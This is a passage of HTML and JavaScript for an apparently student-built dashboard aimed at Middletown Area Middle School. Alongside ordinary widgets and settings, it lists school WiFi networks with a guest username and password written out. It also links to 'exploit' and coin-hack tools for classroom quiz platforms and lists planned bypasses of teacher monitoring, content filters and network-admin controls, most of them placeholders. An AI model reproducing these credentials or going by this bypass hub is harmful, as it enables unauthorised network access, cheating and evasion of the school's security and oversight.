            <h2>📅 Calendar</h2>
            <div class="calendar" id="calendar"></div>
          </div>

          <!-- Motivation Widget -->
          <div class="widget motivation-box" id="motivationBox">
            "The greatest glory in living lies not in never falling, but in rising every time we fall." – Nelson Mandela
          </div>

          <!-- System Status Widget -->
          <div class="widget system-status-widget">
            <h2>💻 System Status</h2>
            <div class="status-item">
              <span class="status-label">CPU Usage:</span>
              <span class="status-value" id="cpuUsage">0%</span>
            </div>
            <div class="status-item">
              <span class="status-label">RAM Usage:</span>
              <span class="status-value" id="ramUsage">0MB / 16GB</span>
            </div>
            <div class="status-item">
              <span class="status-label">Disk Space:</span>
              <span class="status-value" id="diskSpace">500GB / 1TB</span>
            </div>
            <div class="status-item">
              <span class="status-label">Network Status:</span>
              <span class="status-value">Connected (1 Gbps)</span>
            </div>
             <div class="status-item">
              <span class="status-label">Security Scan:</span>
              <span class="status-value critical">Threat Detected</span>
            </div>
          </div>

          <!-- Recent Activity Widget -->
          <div class="widget activity-log-widget">
            <h2>🚀 Recent Activity</h2>
            <div class="activity-log">
              <!-- Log entries will be added dynamically -->
            </div>
            <button class="settings-button" style="margin-top: 10px; padding: 8px 12px; font-size: 0.8em;" onclick="dashboard.clearLog()">Clear Log</button>
          </div>
        </div>

        <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 30px;">
          <div class="widget" style="flex: 1 1 300px;">
            <h2>🔄 Updates</h2>
            <div class="update-entry">Dashboard Interface Update!</div>
            <div class="update-entry">New Exploits Added</div>
            <div class="update-entry">UI Overhaul Deployed</div>
            <div class="update-entry">Security Patch Released v1.5.7</div>
            <div class="update-entry">Performance Enhancements Implemented</div>
          </div>

          <div class="widget" style="flex: 1 1 300px;">
            <h2>🔔 Notifications</h2>
            <p>Starting to work on the log in system. Stay tuned for more!</p>
            <p>System check passed. All modules operational.</p>
            <p>Low disk space detected. Please clear some cache.</p>
          </div>
        </div>
      </section>

      <!-- Info Panels Container (Can be toggled via sidebar or quick bar) -->
      <div id="infoPanelsContainer" class="content-section">
        <!-- WiFi Panel -->
        <div id="wifiPanel" class="info-panel">
          <h2>📡 School WiFi Information</h2>
          <div class="wifi-grid">
            <div>Network Name</div><div>Wifi Level</div><div>Security Type</div><div>Encryption</div><div>Hidden?</div><div>Monitored?</div><div>Username</div><div>Password</div>
          </div>
          <div class="wifi-entry"><div>Middletown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>No</div><div>Yes</div><div>Unknown</div><div>Unknown</div></div>
          <div class="wifi-entry"><div>Mtown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>Yes</div><div>Unknown</div><div>Unknown</div><div>Unknown</div></div>
          <div class="wifi-entry"><div>Mtown Guest</div><div>Medium</div><div>WPA3 Enterprise</div><div>Medium</div><div>No</div><div>Rare</div><div>msguest</div><div>M@ms21#</div></div>
          <div class="wifi-entry"><div>Radius Test</div><div>Low</div><div>WPA3 Enterprise</div><div>Low</div><div>No</div><div>Rarely</div><div>msguest</div><div>M@ms21#</div></div>
        </div>

        <!-- iPad Panel -->
        <div id="ipadPanel" class="info-panel">
          <h2>📱 School iPad Restrictions</h2>
          <div class="ipad-options">
            <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
            <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
          </div>
          <div id="ipadRestrictions" class="ipad-content"><p>Coming soon</p></div>
          <div id="ipadBypasses" class="ipad-content"><p>Coming soon</p></div>
        </div>

        <!-- Handbook Panel -->
        <div id="handbookPanel" class="info-panel">
          <h2>📘 Student Handbooks Information</h2>
          <div class="handbook-buttons">
            <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
            <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20District%20Calendar.pdf" target="_blank">District Calendar 2024-2025</a>
            <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
          </div>
        </div>

        <!-- Map Panel -->
        <div id="mapPanel" class="info-panel">
          <h2>🏫 School Building Map Information</h2>
          <p>Building Map Display</p>
          <div class="coming-soon">Building Map Coming Soon</div>
        </div>

        <!-- Student Websites Panel -->
        <div id="studentWebsitesPanel" class="info-panel">
          <h2>🌐 Student Website's Information</h2>
          <div class="links-list">
            <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
            <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
            <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
            <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
            <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
            <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
            <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
            <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
            <a href="https://id.naviance.com" target="_blank">Naviance</a>
            <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
            <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
            <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
            <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
            <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
            <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
            <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
            <a href="https://clever.com/in/middletownsd" target="_blank">Clever - Student Dashboard</a>
          </div>
        </div>

        <!-- Teacher Websites Panel -->
        <div id="teacherWebsitesPanel" class="info-panel">
          <h2>👩‍🏫 Teacher Websites Information</h2>
          <div class="links-list">
            <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
            <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
            <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
            <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
            <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
            <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
            <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
            <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
            <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
            <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
            <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
            <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
            <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
            <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
            <a href="https://id.naviance.com" target="_blank">Naviance</a>
            <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
            <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
            <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
            <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
            <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
            <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
            <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
            <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
            <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
            <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
          </div>
        </div>

        <!-- Phone Directory Panel -->
        <div id="phoneDirectoryPanel" class="info-panel">
          <h2>📞 School Phone Directory Information</h2>
          <div class="coming-soon">Update Coming Soon!</div>
        </div>

        <!-- Camera Panel -->
        <div id="cameraPanel" class="info-panel">
          <h2>📷 School Camera Information</h2>
          <div class="coming-soon">Update Coming Soon</div>
        </div>

        <!-- School Info Panel -->
        <div id="schoolInfoPanel" class="info-panel">
          <h2>🏫 School Information</h2>
          <div class="school-info-grid">
            <div class="school-info-item"><div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div></div>
            <div class="school-info-item"><div class="school-info-label">School Address:</div><div>215 Oberlin Road Middletown, PA 17057</div></div>
            <div class="school-info-item"><div class="school-info-label">School Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">School Fax:</div><div>717-944-0591</div></div>
            <div class="school-info-item"><div class="school-info-label">School Principal:</div><div>Dr. Shannon L. Wevodau</div></div>
            <div class="school-info-item"><div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal's Phone:</div><div>717-930-0739</div></div>
            <div class="school-info-item"><div class="school-info-label">Assistant Principal's Email:</div><div>mdefilippo@raiderweb.org</div></div>
            <div class="school-info-item"><div class="school-info-label">District Superintendent:</div><div>Dr. Michele Orzini</div></div>
            <div class="school-info-item"><div class="school-info-label">District Website:</div><div><a href="https://www.middletownasd.org/" target="_blank">www.middletownasd.org</a></div></div>
          </div>
        </div>

        <!-- Exploit Panel -->
        <div id="exploitPanel" class="info-panel">
          <h2>🧨 Exploiting Tools</h2>
          <div class="exploit-buttons">
            <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
            <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank">Kahoot Exploit</a>
            <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank">Gimkit Exploit</a>
            <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank">Quizlet Exploit</a>
            <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank">Quizzes Exploit</a>
            <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank">Quills Exploit</a>
            <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank">Edpuzzle Exploit</a>
            <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank">Nearpod Exploit</a>
            <a href="https://sites.google.com/view/tools-2/ Gimkit-Coin-Hack" target="_blank">Gimkit Coin Hack</a>
            <a href="https://sites.google.com/view/tools-2/ Blooket-Blooks-Hack" target="_blank">Blooket Blooks Hack</a>
          </div>
        </div>

        <!-- Bypass Panel -->
        <div id="bypassPanel" class="info-panel">
          <h2>🚪 Bypassing Tools</h2>
          <div class="bypass-buttons">
            <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
            <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
            <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
            <button onclick="dashboard.showBypassContent('contentfilter')">Content Filter Bypass</button>
            <button onclick="dashboard.showBypassContent('networkadmin')">Network Admin Bypass</button>
            <button onclick="dashboard.showBypassContent('studentportal')">Student Portal Bypass</button>
          </div>
          <div id="bathroomBypass" class="bypass-content"><p>Detailed steps for bathroom bypass are still under development.</p></div>
          <div id="wifiBypass" class="bypass-content"><p>For WiFi bypass, please refer to the 'School WiFi Information' section for network details.</p></div>
          <div id="monitoringBypass" class="bypass-content"><p>Bypassing teacher monitoring is a complex process. Advanced techniques will be detailed here soon.</p></div>
          <div id="contentfilterBypass" class="bypass-content"><p>Content filter bypass methods will be listed here as they are discovered and tested.</p></div>
          <div id="networkadminBypass" class="bypass-content"><p>Information on bypassing network administrator restrictions will be added shortly.</p></div>
          <div id="studentportalBypass" class="bypass-content"><p>Student portal access bypass methods are being compiled. Check back soon.</p></div>
        </div>

        <!-- VPN Panel -->
        <div id="vpnPanel" class="info-panel">
          <h2>🔐 VPN Websites</h2>
          <div class="links-list">
            <a href="https://www.nordvpn.com" target="_blank">NordVPN</a>
            <a href="https://www.expressvpn.com" target="_blank">ExpressVPN</a>
            <a href="https://www.surfshark.com" target="_blank">Surfshark VPN</a>
            <a href="https://www.privateinternetaccess.com" target="_blank">Private Internet Access</a>
            <a href="https://www.cyberghostvpn.com" target="_blank">CyberGhost VPN</a>
            <a href="https://www.protonvpn.com" target="_blank">ProtonVPN</a>
          </div>
        </div>

        <!-- Gaming Panel -->
        <div id="gamingPanel" class="info-panel">
          <h2>🎮 Gaming Websites</h2>
          <div class="coming-soon">GAMING WEBSITES COMING SOON</div>
          <p>We are curating a list of secure and accessible gaming platforms suitable for educational environments.</p>
        </div>

        <!-- Music Panel -->
        <div id="musicPanel" class="info-panel">
          <h2>🎵 Music Websites</h2>
          <div class="coming-soon">MUSIC WEBSITES COMING SOON</div>
          <p>Explore curated music streaming and creation tools that comply with school policies.</p>
        </div>

        <!-- Keyboard Panel -->
        <div id="keyboardPanel" class="info-panel">
          <h2>🎹 Keyboard Tricks & Shortcuts</h2>
          <div class="info-text">
            <p><b>System Shortcuts:</b></p><ul><li>Access Spotlight Search: Press Command (⌘) + Space bar.</li><li>Return to the Home screen: Press Command (⌘) + H.</li><li>Show the Dock: Press Command (⌘) + Option (⌥) + D.</li><li>Show the App Library: Press Shift (⇧) + Globe + A.</li><li>Open Quick Note: Press Globe + Q.</li><li>Open Siri: Press Globe + S.</li><li>Open Control Center: Press Globe + C.</li><li>Open Notification Center: Press Globe + N.</li><li>Show all windows: Press Globe + Down Arrow.</li><li>Open the App Switcher: Press Globe + Up Arrow.</li></ul><p><b>Multitasking Shortcuts:</b></p><ul><li>Switch to the last active app: Press Command (⌘) + Tab.</li><li>View all active apps: Press and hold Command (⌘) + Tab.</li><li>Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.</li><li>Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.</li><li>Open Slide Over: Press Globe + Backslash.</li><li>Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.</li></ul><p><b>Safari and App-Specific Shortcuts:</b></p><ul><li>Take a full-screen screenshot: Press Command (⌘) + Shift + 3.</li><li>Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.</li><li>Open a new private tab: Press Command (⌘) + Shift + N.</li><li>Open a new tab: Press Command (⌘) + T or Command (⌘) + N.</li><li>Close the current tab: Press Command (⌘) + W.</li><li>Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.</li><li>Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.</li><li>Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.</li><li>Reopen the last closed tab: Press Shift + Command (⌘) + T.</li><li>Go to a specific tab (1-8): Press Command (⌘) + (1-8).</li><li>Go to the last tab: Press Command (⌘) + 9.</li><li>Open the Tab Grid: Press Shift + Command (⌘) + .</li><li>Open a new Incognito tab: Press Shift + Command (⌘) + N.</li><li>Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.</li><li>Open a new window: Press Option (⌥) + Command (⌘) + N.</li></ul><p><b>General Navigation and Text Editing:</b></p><ul><li>Navigate between elements: Press Tab.</li><li>Select all text: Press Command (⌘) + A.</li><li>Copy selected text: Press Command (⌘) + C.</li><li>Cut selected text: Press Command (⌘) + X.</li><li>Paste copied text: Press Command (⌘) + V.</li><li>Undo: Press Command (⌘) + Z.</li><li>Redo: Press Command (⌘) + Shift + Z.</li><li>Jump to top: Press Command (⌘) + Up Arrow.</li><li>Jump to bottom: Press Command (⌘) + Down Arrow.</li><li>Highlight text character-by-character: Press Shift + Left or Right Arrow.</li></ul><p><b>To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</b></p>
          </div>
        </div>
      </div>

      <!-- System Tools Section -->
      <div id="systemTools" class="content-section">
        <div class="system-tools-section">
            <h2>🔧 System Tools</h2>
            <div class="system-tools-grid">
                <button onclick="handleToolClick('System Diagnostics', dashboard.runSystemDiagnostics)"><i class="fas fa-shield-alt"></i><span>System Diagnostics</span></button>
                <button onclick="handleToolClick('Calculator', dashboard.openCalculator)"><i class="fas fa-calculator"></i><span>Calculator</span></button>
                <button onclick="handleToolClick('System Monitor', dashboard.openSystemMonitor)"><i class="fas fa-chart-line"></i><span>System Monitor</span></button>
                <button onclick="handleToolClick('File Manager', dashboard.openFileManager)"><i class="fas fa-folder-open"></i><span>File Manager</span></button>
                <button onclick="handleToolClick('Process Viewer', dashboard.openProcessViewer)"><i class="fas fa-cogs"></i><span>Process Viewer</span></button>
                <button onclick="handleToolClick('Network Scanner', dashboard.openNetworkScanner)"><i class="fas fa-wifi"></i><span>Network Scanner</span></button>
                <button onclick="handleToolClick('Security Advisor', dashboard.openSecurityAdvisor)"><i class="fas fa-user-secret"></i><span>Security Advisor</span></button>
                <button onclick="handleToolClick('Password Generator', dashboard.openPasswordGenerator)"><i class="fas fa-key"></i><span>Password Generator</span></button>
                <button onclick="handleToolClick('Data Encryptor', dashboard.openDataEncryptor)"><i class="fas fa-lock"></i><span>Data Encryptor</span></button>
                <button onclick="handleToolClick('System Cleaner', dashboard.openSystemCleaner)"><i class="fas fa-broom"></i><span>System Cleaner</span></button>
                <a href="https://www.google.com" target="_blank" onclick="handleToolClick('Web Search', null)"><i class="fas fa-search"></i><span>Web Search</span></a>
                <button onclick="handleToolClick('Backup Utility', dashboard.openBackupUtility)"><i class="fas fa-cloud-upload-alt"></i><span>Backup Utility</span></button>
                <button onclick="handleToolClick('Remote Access', dashboard.openRemoteAccess)"><i class="fas fa-laptop-house"></i><span>Remote Access</span></button>
                <button onclick="handleToolClick('Data Recovery', dashboard.openDataRecovery)"><i class="fas fa-database"></i><span>Data Recovery</span></button>
            </div>
        </div>
      </div>

      <!-- Notes Section (Canvas) -->
      <div id="notes" class="content-section">
        <div id="canvasContainer">
          <h2>🖌️ Notes Canvas</h2>
          <canvas id="notesCanvas" width="700" height="400"></canvas> <!-- Slightly larger canvas -->
          <div id="canvasControls">
            <button id="clearCanvasBtn">Clear Canvas</button>
            <button id="exportNotesBtn">💾 Export Notes</button>
            <button id="closeCanvasBtn">Close Notes</button>
          </div>
        </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="content-section">
        <h2>⚙️ System Settings</h2>

        <!-- Appearance Settings -->
        <div class="settings-section">
          <h3>🎨 Appearance</h3>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">Theme</label>
              <div class="checkbox-setting">
                <input type="checkbox" id="settingsThemeToggle" />
                <label for="settingsThemeToggle">Enable Light Mode</label>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Accent Color</label>
              <div class="color-picker-wrapper">
                <input type="color" id="settingsAccentColor" value="#ff914d">
                <label for="settingsAccentColor">#ff914d</label>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Font Size (px)</label>
              <div class="slider-setting">
                <input type="range" id="settingsFontSize" min="12" max="20" value="14">
                <span id="fontSizeValue">14px</span>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">UI Density</label>
              <div class="slider-setting">
                <input type="range" id="settingsUIDensity" min="0" max="1" step="0.1" value="0.5">
                <span id="uiDensityValue">Medium</span>
              </div>
            </div>
          </div>
        </div>

        <!-- System Emulation Settings -->
        <div class="settings-section">
          <h3>💻 System Emulation</h3>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">CPU Cores</label>
              <input type="number" id="settingsCPUCores" class="setting-input" value="8">
            </div>
            <div class="setting-item">
              <label class="setting-label">Total RAM (GB)</label>
              <input type="number" id="settingsTotalRAM" class="setting-input" value="16">
            </div>
            <div class="setting-item">
              <label class="setting-label">OS Version</label>
              <input type="text" id="settingsOSVersion" class="setting-input" value="Windows 11 Pro (Simulated)">
            </div>
            <div class="setting-item">
              <label class="setting-label">Network Speed</label>
              <input type="text" id="settingsNetworkSpeed" class="setting-input" value="1 Gbps (Simulated)">
            </div>
            <div class="setting-item">
              <label class="setting-label">Disk Space (Total)</label>
              <input type="text" id="settingsTotalDisk" class="setting-input" value="1 TB SSD (Simulated)">
            </div>
            <div class="setting-item">
              <label class="setting-label">Disk Space (Available)</label>
              <input type="text" id="settingsAvailableDisk" class="setting-input" value="500 GB (Simulated)">
            </div>
          </div>
        </div>

        <!-- Security Settings -->
        <div class="settings-section">
          <h3>🔒 Security</h3>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">Password Policy</label>
              <select id="settingsPasswordPolicy" class="setting-input">
                <option>Standard (8+ Chars, Upper, Lower, Num, Symbol)</option>
                <option>Medium (6+ Chars, Alpha-Numeric)</option>
                <option>Simple (4+ Alphanumeric)</option>
              </select>
            </div>
            <div class="setting-item">
              <label class="setting-label">Firewall Status</label>
              <div class="checkbox-setting">
                <input type="checkbox" id="settingsFirewallStatus" checked />
                <label for="settingsFirewallStatus">Enabled</label>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Antivirus Status</label>
              <div class="checkbox-setting">
                <input type="checkbox" id="settingsAntivirusStatus" checked />
                <label for="settingsAntivirusStatus">Active & Updated</label>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Session Timeout (mins)</label>
              <input type="number" id="settingsSessionTimeout" class="setting-input" value="15">
            </div>
          </div>
        </div>

        <!-- User Management Settings -->
        <div class="settings-section">
          <h3>👤 User Management</h3>
          <p>Simulated user management. New users cannot be added through this interface.</p>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">Current User</label>
              <input type="text" id="settingsCurrentUser" class="setting-input" value="Beta.user" readonly />
            </div>
            <div class="setting-item">
              <label class="setting-label">User ID</label>
              <input type="text" id="settingsUserID" class="setting-input" value="281573" readonly />
            </div>
            <div class="setting-item">
              <label class="setting-label">Access Level</label>
              <input type="text" id="settingsAccessLevel" class="setting-input" value="Administrator (Simulated)" readonly />
            </div>
          </div>
          <button class="settings-button">View All Users</button>
        </div>

        <!-- Reminder Settings -->
        <div class="settings-section">
          <h3>⏰ Reminders</h3>
          <div id="reminderInputDiv">
            <input type="text" id="reminderTextInput" class="setting-input" placeholder="Enter reminder text..." />
            <input type="datetime-local" id="reminderDateTimeInput" class="setting-input" />
            <button class="settings-button" onclick="dashboard.addReminder()"><i class="fas fa-plus"></i> Add Reminder</button>
          </div>
          <ul id="reminderList"></ul>
        </div>

        <!-- Animation & Performance Settings -->
        <div class="settings-section">
          <h3>✨ Animations & Performance</h3>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">UI Animations</label>
              <div class="checkbox-setting">
                <input type="checkbox" id="settingsEnableAnimations" checked />
                <label for="settingsEnableAnimations">Enabled</label>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Animation Speed</label>
              <div class="slider-setting">
                <input type="range" id="settingsAnimationSpeed" min="0.5" max="2" step="0.1" value="1" />
                <span id="animationSpeedValue">1.0x</span>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Notification Duration (s)</label>
              <div class="slider-setting">
                <input type="range" id="settingsNotificationDuration" min="2" max="10" value="5" />
                <span id="notificationDurationValue">5s</span>
              </div>
            </div>
            <div class="setting-item">
              <label class="setting-label">Sound Alerts</label>
              <div class="checkbox-setting">
                <input type="checkbox" id="settingsSoundAlerts" />
                <label for="settingsSoundAlerts">Enabled</label>
              </div>
            </div>
          </div>
        </div>

        <!-- Other Settings -->
        <div class="settings-section">
          <h3>🎛️ Other</h3>
          <div class="settings-grid">
            <div class="setting-item">
              <label class="setting-label">Custom CSS</label>
              <textarea id="settingsCustomCSS" class="textarea-setting" placeholder="/* Add your custom CSS here */"></textarea>
            </div>
          </div>
        </div>

        <div style="clear:both; overflow:hidden; margin-top: 20px;">
          <button class="settings-button" style="float: right;" onclick="dashboard.saveSettings()">Save Settings</button>
          <button class="settings-button" style="float: left;" onclick="dashboard.togglePanel('settingsPanel'); dashboard.updateActiveSidebarLink();">Close Settings</button>
        </div>
      </div>
    </main>

  </div> <!-- End of dashboard -->

  <!-- Notification Area -->
  <div id="notificationArea"></div>

  <script>
    // Dashboard functionality object
    const dashboard = {
      sessionTimerInterval: null,
      clockTimerInterval: null,
      currentSection: 'overview', // Track current active section

      // Initialize all dashboard functionality
      init: function() {
        this.loadSettings(); // Load settings first
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initSidebar(); // Initialize sidebar functionality
        this.initSystemStatus(); // Initialize dynamic status indicators
        this.updateActiveSidebarLink(); // Set initial active link
        this.initSectionNav(); // Handle scrolling to sections
        // Ensure overview section is shown by default if not already
        document.getElementById('overview').style.display = 'block'; 
      },
      
      // --- UI Initialization Functions ---
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        this.sessionTimerInterval = setInterval(updateSessionTime, 1000);
      },
      
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        this.clockTimerInterval = setInterval(updateClock, 1000);
      },
      
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => { const div = document.createElement('div'); div.innerText = day; calendar.appendChild(div); });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) { const empty = document.createElement('div'); calendar.appendChild(empty); }
        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      initThemeToggle: function() {
